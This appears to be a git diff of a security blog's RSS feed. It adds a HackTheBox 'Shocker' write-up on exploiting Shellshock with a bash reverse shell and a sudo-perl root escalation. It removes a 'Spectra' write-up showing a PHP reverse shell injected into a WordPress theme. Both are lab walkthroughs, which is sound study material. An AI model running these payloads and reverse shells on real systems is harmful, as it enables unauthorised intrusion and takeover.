@@ -5,7 +5,247 @@
     <link>https://fahmifj.github.io/</link>
     <description>Recent content on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Sat, 10 Jul 2021 20:28:32 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 13 Jul 2021 11:30:31 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Shocker</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</link>
+      <pubDate>Tue, 13 Jul 2021 11:30:31 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-shocker/</guid>
+      <description>Shellshock is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on perl , and this can leveraged as well to gain root shell.
+In the end of this write-up, I&amp;rsquo;ll see how the Shellshock vulnerability works.
+Skills Learned  Exploitation of Shellshock vulnerability Exploitation of sudo privileges on perl  Tools  Nmap Burp Suite Gobuster  Reconnaissance A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</description>
+      <content:encoded><![CDATA[<p>Shellshock is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on <code>perl</code> , and this can leveraged as well to gain root shell.</p>
+<p>In the end of this write-up, I&rsquo;ll see how the Shellshock vulnerability works.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Exploitation of Shellshock vulnerability</li>
+<li>Exploitation of sudo privileges on perl</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Nmap</li>
+<li>Burp Suite</li>
+<li>Gobuster</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.</p>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
+$ nmap -p- -sV -oA nmap/10-tcp-allport-shocker 10.10.10.56 
+Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-07-10 20:24 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.56
+Host is up <span style="color:#f92672">(</span>0.065s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65533</span> closed ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 98.00 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>The site serves only one a text and an image.</p>
+<p><img class="img-container" src="imgs/image-20210711072532615.png" alt="image-20210711072532615"  />
+</p>
+<p>The server response contains uncommon Header called <code>Accept-Ranges</code>. According to <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests#requesting_a_specific_range_from_a_server">MDN</a>, this header is allows us to control the portion of the HTTP message.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
+$ curl -I http://10.10.10.56
+HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+Date: Sun, <span style="color:#ae81ff">11</span> Jul <span style="color:#ae81ff">2021</span> 00:49:51 GMT
+Server: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+Last-Modified: Fri, <span style="color:#ae81ff">22</span> Sep <span style="color:#ae81ff">2017</span> 20:01:19 GMT
+ETag: <span style="color:#e6db74">&#34;89-559ccac257884&#34;</span>
+Accept-Ranges: bytes
+Content-Length: <span style="color:#ae81ff">137</span>
+Vary: Accept-Encoding
+Content-Type: text/html
+</code></pre></div><p>A <a href="https://www.rapid7.com/db/modules/auxiliary/dos/http/apache_range_dos/">quick search</a> on google finds that it can be used for DDoS attack.</p>
+<h4 id="gobuster">Gobuster</h4>
+<p>A <code>gobuster</code> scan finds two directories:  <code>/cgi-bin/</code> and <code>/icons</code></p>
+<pre><code>→ kali@kali «shocker» «10.10.14.83» 
+$ gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-S-80 -f         
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.56/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Add Slash:               true
+[+] Timeout:                 10s
+===============================================================
+2021/07/10 20:26:07 Starting gobuster in directory enumeration mode
+===============================================================
+/cgi-bin/             (Status: 403) [Size: 294]
+/icons/               (Status: 403) [Size: 292]
+...[SNIP]...
+</code></pre><p>Another scan on <code>/cgi-bin/</code> discovers a file called <code>users.sh</code></p>
+<pre><code>→ kali@kali «shocker» «10.10.14.83» 
+$ gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster/gobuster-cgi-bin -f -x cgi,sh
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.56/cgi-bin
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              cgi,sh
+[+] Add Slash:               true
+[+] Timeout:                 10s
+===============================================================
+2021/07/10 21:43:04 Starting gobuster in directory enumeration mode
+===============================================================
+/user.sh              (Status: 200) [Size: 125]
+...[SNIP]...
+</code></pre><p>The <code>script.sh</code> returns the following contents.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ kali@kali «shocker» «10.10.14.83» 
+$ curl -s http://10.10.10.56/cgi-bin/user.sh
+Content-Type: text/plain
+
+Just an uptime test script
+
+ 21:46:09 up <span style="color:#ae81ff">1</span> day, 20:28,  <span style="color:#ae81ff">0</span> users,  load average: 0.00, 0.01, 0.00
+
+</code></pre></div><p>According to the box name and a <code>/cgi-bin/</code> folder which contains a bash script, it&rsquo;s going to be shellshock vulnerability.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-shelly">Shell as shelly</h3>
+<h4 id="shellshock-cve-2014-6271">Shellshock (CVE-2014-6271)</h4>
+<p>The Shellshock vulnerability is well explained in this <a href="https://pentesterlab.com/exercises/cve-2014-6271/course">free course</a> by PentesterLab.</p>
+<p>The following is the commonly used PoC for shellshock.</p>
+<pre><code>(){:}; echo; &lt;bash command&gt;
+</code></pre><p>The PoC works on <code>User-Agent</code> header.</p>
+<p><img class="img-container" src="imgs/image-20210711090447537-1626151933213.png" alt="image-20210711090447537"  />
+</p>
+<p>It also works on the  <code>Accept</code> header (I&rsquo;m shocked now 😄).</p>
+<p><img class="img-container" src="imgs/image-20210711085942731.png" alt="image-20210711085942731"  />
+</p>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>I tried to get a shell but somehow it didn&rsquo;t connect back, but then I figured out why after redirecting stderr to stderr, it wanted a full path!</p>
+<p><img class="img-container" src="imgs/image-20210711091930431.png" alt="image-20210711091930431"  />
+</p>
+<p>The installed <code>nc</code> doesn&rsquo;t have <code>-e</code>.</p>
+<p><img class="img-container" src="imgs/image-20210711092401328.png" alt="image-20210711092401328"  />
+</p>
+<p>The following bash reverse shell works.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">()</span> <span style="color:#f92672">{</span> :;<span style="color:#f92672">}</span>; echo; echo <span style="color:#e6db74">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.83/53 0&gt;&amp;1&#34;</span> | /bin/bash
+</code></pre></div><p><img class="img-container" src="imgs/image-20210711093314357.png" alt="image-20210711093314357"  />
+</p>
+<h4 id="shell-upgrade">Shell Upgrade</h4>
+<p>I&rsquo;ll upgrade my shell using the PTY trick (that&rsquo;s how I called it).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ export TERM<span style="color:#f92672">=</span>xterm
+export TERM<span style="color:#f92672">=</span>xterm
+shelly@Shocker:/usr/lib/cgi-bin$ script /dev/null -c bash                    
+script /dev/null -c bash
+Script started, file is /dev/null
+shelly@Shocker:/usr/lib/cgi-bin$ ^Z
+<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7339</span> suspended  nc -nvlp <span style="color:#ae81ff">53</span>
+→ kali@kali «shocker» «10.10.14.83» 
+$ stty raw -echo; fg
+<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7339</span> continued  nc -nvlp <span style="color:#ae81ff">53</span>
+
+shelly@Shocker:/usr/lib/cgi-bin$  
+</code></pre></div><p>The user flag is done here.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ ls -l 
+total <span style="color:#ae81ff">8</span>
+drwxr-xr-x <span style="color:#ae81ff">2</span> shelly shelly <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">10</span> 03:31 test
+-r--r--r-- <span style="color:#ae81ff">1</span> root   root     <span style="color:#ae81ff">33</span> Jul  <span style="color:#ae81ff">9</span> 01:17 user.txt
+shelly@Shocker:/home/shelly$ cat user.txt 
+7ac9eb73e6cb...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="internal-enumeration">Internal Enumeration</h4>
+<p>A quick check on sudo privileges reveals that user <code>shelly</code> can run <code>perl</code> with <code>sudo</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
+sudo -l
+Matching Defaults entries <span style="color:#66d9ef">for</span> shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+
+User shelly may run the following commands on Shocker:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/perl
+</code></pre></div><h4 id="sudo---perl">Sudo - perl</h4>
+<p>Using <a href="https://gtfobins.github.io/gtfobins/perl/#sudo">GTFOBins</a> as reference, I&rsquo;m now root.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">shelly@Shocker:/home/shelly$ sudo -u root perl -e <span style="color:#e6db74">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
+root@Shocker:/home/shelly# id <span style="color:#f92672">&amp;&amp;</span> hostname
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+Shocker
+root@Shocker:/home/shelly#
+</code></pre></div><p>The root flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@Shocker:~# cat root.txt
+e3689b13acb2...<span style="color:#f92672">[</span>SNIP<span style="color:#f92672">]</span>...
+</code></pre></div><h2 id="extras">Extras</h2>
+<p>Since this vulnerability is interesting yet dangerous, I&rsquo;d like to observe how it works.</p>
+<h3 id="playing-a-bit-with-shellshock">Playing a bit with Shellshock</h3>
+<p>I did a quick test using the following script which placed under /<code>cgi-bin/</code> folder. The script will prints all the environment variables.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@Shocker:/usr/lib/cgi-bin# echo -e <span style="color:#e6db74">&#39;#!/bin/bash\necho test\nenv&#39;</span> &gt; iamf.sh
+root@Shocker:/usr/lib/cgi-bin# chmod +x iamf.sh 
+</code></pre></div><p>And now I could understand why it is so dangerous. It even exports my custom header and turns it into an environment variable.</p>
+<p><img class="img-container" src="imgs/image-20210711100705447.png" alt="image-20210711100705447"  />
+</p>
+<p>The full response</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">HTTP/1.1 200 OK
+Date: Sun, 11 Jul 2021 03:06:31 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Connection: close
+Content-Type: text/x-sh
+Content-Length: 1113
+
+iamf
+test
+SERVER_SIGNATURE=&lt;address&gt;Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80&lt;/address&gt;
+
+HTTP_USER_AGENT=Blackhole
+SERVER_PORT=80
+HTTP_HOST=10.10.10.56
+DOCUMENT_ROOT=/var/www/html
+SCRIPT_FILENAME=/usr/lib/cgi-bin/iamf.sh
+REQUEST_URI=/cgi-bin/iamf.sh
+SCRIPT_NAME=/cgi-bin/iamf.sh
+HTTP_CONNECTION=close
+REMOTE_PORT=58222
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+HTTP_IF_NONE_MATCH=&#34;89-559ccac257884-gzip&#34;
+CONTEXT_PREFIX=/cgi-bin/
+PWD=/usr/lib/cgi-bin
+SERVER_ADMIN=webmaster@localhost
+REQUEST_SCHEME=http
+HTTP_IF_MODIFIED_SINCE=Fri, 22 Sep 2017 20:01:19 GMT
+HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
+HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+REMOTE_ADDR=10.10.14.83
+SHLVL=1
+SERVER_NAME=10.10.10.56
+CONTENT_LENGTH=0
+SERVER_SOFTWARE=Apache/2.4.18 (Ubuntu)
+QUERY_STRING=
+SERVER_ADDR=10.10.10.56
+GATEWAY_INTERFACE=CGI/1.1
+HTTP_UPGRADE_INSECURE_REQUESTS=1
+SERVER_PROTOCOL=HTTP/1.1
+HTTP_CACHE_CONTROL=max-age=0
+HTTP_ACCEPT_ENCODING=gzip, deflate
+REQUEST_METHOD=GET
+CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/
+HTTP_IAMF_HEADER=() {  :
+}
+_=/usr/bin/env
+</code></pre></div><hr>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://pentesterlab.com/exercises/cve-2014-6271/course">https://pentesterlab.com/exercises/cve-2014-6271/course</a></li>
+<li><a href="https://gtfobins.github.io/gtfobins/perl/#sudo">https://gtfobins.github.io/gtfobins/perl/#sudo</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - Atom</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-atom/</link>
@@ -870,368 +1110,6 @@ uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www
 <h2 id="references">Reference(s)</h2>
 <ul>
 <li><a href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a></li>
-</ul>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Spectra</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</link>
-      <pubDate>Sat, 26 Jun 2021 21:27:14 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-spectra/</guid>
-      <description>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts by enumerating a misconfigured WordPress website, which has a directory listing enabled, exposing its source files. A database password is obtained from one of the files, and it can be used to access the admin dashboard. With administrator access, I&amp;rsquo;m able to inject a PHP code into a theme file to get a foothold on the system.</description>
-      <content:encoded><![CDATA[<p>Spectra is an easy machine from HackTheBox that runs a Chrome OS. It starts by enumerating a misconfigured WordPress website, which has a directory listing enabled, exposing its source files. A database password is obtained from one of the files, and it can be used to access the admin dashboard. With administrator access, I&rsquo;m able to inject a PHP code into a theme file to get a foothold on the system. Internal enumeration finds an auto-login password and the password is reused by the user. The user has sudo privileges on <code>initctl</code>, which can be leveraged to get a root shell.</p>
-<h3 id="skills-learned">Skills Learned</h3>
-<ul>
-<li>Exploiting WordPress</li>
-<li>Command injection</li>
-<li>Exploiting sudo privileges on initctl</li>
-</ul>
-<h3 id="tools">Tools</h3>
-<ul>
-<li>Nmap</li>
-<li>CrackMapExec</li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p><code>nmap</code> full scan discovers three open ports: SSH on port 22, Nginx web server in port 80, and MySQL.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
-$ nmap -p- -sV --reason -oA nmap/10-allport 10.10.10.229
-Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-15 10:10 EDT
-Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.229
-Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.052s latency<span style="color:#f92672">)</span>.
-Not shown: <span style="color:#ae81ff">65532</span> closed ports
-Reason: <span style="color:#ae81ff">65532</span> resets
-PORT     STATE SERVICE REASON         VERSION
-22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
-80/tcp   open  http    syn-ack ttl <span style="color:#ae81ff">63</span> nginx 1.17.4
-3306/tcp open  mysql   syn-ack ttl <span style="color:#ae81ff">63</span> MySQL <span style="color:#f92672">(</span>unauthorized<span style="color:#f92672">)</span>
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 123.14 seconds
-</code></pre></div><p>MySQL service is normally tied to 127.0.0.1, but <code>nmap</code> already identified that I have no access there.</p>
-<p>Running a script scan didn&rsquo;t find any interesting information.</p>
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-80---spectrahtb">TCP 80 - spectra.htb</h3>
-<p>The site appears to be under development.</p>
-<p><img class="img-container" src="imgs/image-20210515212024368.png" alt="image-20210515212024368"  />
-</p>
-<p>Inspecting page source discovers a hostname and two directories:</p>
-<ul>
-<li><a href="http://spectra.htb/main/index.php">http://spectra.htb/main/index.php</a></li>
-<li><a href="http://spectra.htb/testing/index.php">http://spectra.htb/testing/index.php</a></li>
-</ul>
-<p><img class="img-container" src="imgs/image-20210515212038877.png" alt="image-20210515212038877"  />
-</p>
-<p>I&rsquo;ll update my <code>/etc/hosts</code> with the hostname.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
-$ echo <span style="color:#e6db74">&#39;10.10.10.229 spectra.htb&#39;</span> &gt;&gt; /etc/hosts
-</code></pre></div><p>Poking with <code>curl</code>, shows that with or without the hostname it&rsquo;s the same site.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «~» «10.10.14.9» 
-$ curl -s http://spectra.htb/ | wc -c
-<span style="color:#ae81ff">283</span>
-→ root@kali «~» «10.10.14.9» 
-$ curl -s http://10.10.10.229 | wc -c
-<span style="color:#ae81ff">283</span>
-</code></pre></div><p>Clicking on &ldquo;<strong>Software Issue Tracker</strong>&rdquo;, redirects to a WordPress site and nothing interesting except one default post by administrator.</p>
-<p><img class="img-container" src="imgs/image-20210626224157109.png" alt="image-20210626224157109"  />
-</p>
-<p>Visiting &ldquo;<strong>Test</strong>&rdquo;, the site page shows an error message about database connection.</p>
-<p><img class="img-container" src="imgs/image-20210515214125642.png" alt="image-20210515214125642"  />
-</p>
-<p>Removing <code>index.php</code> from URL, discovers that this page has directory listing is enabled.</p>
-<p><img class="img-container" src="imgs/image-20210515221118144.png" alt="image-20210515221118144"  />
-</p>
-<p>The  <code>wp-config.php.save</code> file draws my attention. It contains a set of database credentials.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
-$ curl http://spectra.htb/testing/wp-config.php.save
-&lt;?php
-...&lt;SNIP&gt;...
-
-define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>, <span style="color:#e6db74">&#39;dev&#39;</span> <span style="color:#f92672">)</span>;
-
-/** MySQL database username */
-define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;devtest&#39;</span> <span style="color:#f92672">)</span>;
-
-/** MySQL database password */
-define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;devteam01&#39;</span> <span style="color:#f92672">)</span>;
-
-/** MySQL hostname */
-define<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_HOST&#39;</span>, <span style="color:#e6db74">&#39;localhost&#39;</span> <span style="color:#f92672">)</span>;
-...&lt;SNIP&gt;...
-</code></pre></div><h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-nginx">Shell as nginx</h3>
-<h4 id="wp-admin-dashboard">WP-Admin Dashboard</h4>
-<p>The database password works with administrator account (<code>administrator:devteam01</code>), it allows me to access the admin dashboard.</p>
-<p><img class="img-container" src="imgs/image-20210626225944808.png" alt="image-20210626225944808"  />
-</p>
-<h4 id="injecting-reverse-shell">Injecting Reverse Shell</h4>
-<p>Armed with administrator access, I can inject a malicious PHP code into one of the available themes files and execute it by visiting the full URL of the theme file. In this case, I&rsquo;ll inject a <a href="https://github.com/pentestmonkey/php-reverse-shell">reverse shell</a> script in <code>404.php</code> file of the Twenty Nineteen theme. The file can be found at <strong>Appearance</strong> &gt; <strong>Theme Editor</strong>.</p>
-<p><img class="img-container" src="imgs/image-20210515231108016.png" alt="image-20210515231108016"  />
-</p>
-<p>I&rsquo;ll access this URL to get a shell: <code>http://spectra.htb/main/wp-content/themes/twentynineteen/404.php</code>, but it returns an error message pointing on line 12.</p>
-<p><img class="img-container" src="imgs/image-20210515231346411.png" alt="image-20210515231346411"  />
-</p>
-<p>I&rsquo;m able to resolve the error by commenting out the line 12.</p>
-<p><img class="img-container" src="imgs/image-20210515231422348.png" alt="image-20210515231422348"  />
-</p>
-<p>This time, I&rsquo;ll trigger the reverse shell using <code>curl</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
-$ curl -s http://spectra.htb/main/wp-content/themes/twentynineteen/404.php
-</code></pre></div><p>On my listener.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «spectra» «10.10.14.21» 
-$ nc -nvlp <span style="color:#ae81ff">9001</span>
-listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
-connect to <span style="color:#f92672">[</span>10.10.14.21<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.229<span style="color:#f92672">]</span> <span style="color:#ae81ff">35166</span>
-Linux spectra 5.4.66+ <span style="color:#75715e">#1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64 AMD EPYC 7302P 16-Core Processor AuthenticAMD GNU/Linux</span>
- 09:14:42 up 10:53,  <span style="color:#ae81ff">0</span> users,  load average: 0.02, 0.04, 0.00
-USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
-uid<span style="color:#f92672">=</span>20155<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>20156<span style="color:#f92672">(</span>nginx<span style="color:#f92672">)</span>
-$ hostname
-spectra
-</code></pre></div><h4 id="shell-upgrade">Shell upgrade</h4>
-<p>My current shell doesn&rsquo;t have PATH variable set, so I have to use the full path to upgrade my shell.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ which python3
-which: no python3 in <span style="color:#f92672">((</span>null<span style="color:#f92672">))</span>
-$ ls /usr/bin/ | grep python 
-python
-python-config
-python-wrapper
-python2
-python2.7
-python3
-python3.6
-python3.6m
-$ /usr/bin/python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-nginx@spectra / $ export TERM<span style="color:#f92672">=</span>xterm
-nginx@spectra / $ ^Z
-<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7285</span> suspended  nc -nvlp <span style="color:#ae81ff">9001</span>
-→ root@kali «spectra» «10.10.14.21» 
-$ stty raw -echo; fg
-<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">7285</span> continued  nc -nvlp <span style="color:#ae81ff">9001</span>
-
-nginx@spectra / $ 
-</code></pre></div><p>To resolve the <code>((null))</code> message, I&rsquo;ll add <code>/usr/bin</code> to current PATH variable.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ env
-TERM<span style="color:#f92672">=</span>xterm
-USER<span style="color:#f92672">=</span>nginx
-PWD<span style="color:#f92672">=</span>/
-SHLVL<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
-HOME<span style="color:#f92672">=</span>/home/nginx
-_<span style="color:#f92672">=</span>/usr/bin/env
-nginx@spectra / $ export PATH<span style="color:#f92672">=</span>$PATH:/usr/bin 
-nginx@spectra / $ which python
-/usr/local/bin/python
-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-katie">Shell as katie</h3>
-<h4 id="internal-enumeration">Internal Enumeration</h4>
-<p>There are 4 users with login shell in this machine.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ cat /etc/passwd | grep sh$  
-root:x:0:0:root:/root:/bin/bash
-chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash
-nginx:x:20155:20156::/home/nginx:/bin/bash
-katie:x:20156:20157::/home/katie:/bin/bash
-</code></pre></div><p>Enumerating home directory shows the user flag is on  <code>katie</code>&rsquo;s home directory.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nginx@spectra / $ ls -lR /home 2&gt;/dev/null
-...&lt;SNIP&gt;...
-/home/katie:
-total <span style="color:#ae81ff">8</span>
-drwxr-xr-x <span style="color:#ae81ff">2</span> katie katie <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">15</span> 15:55 log
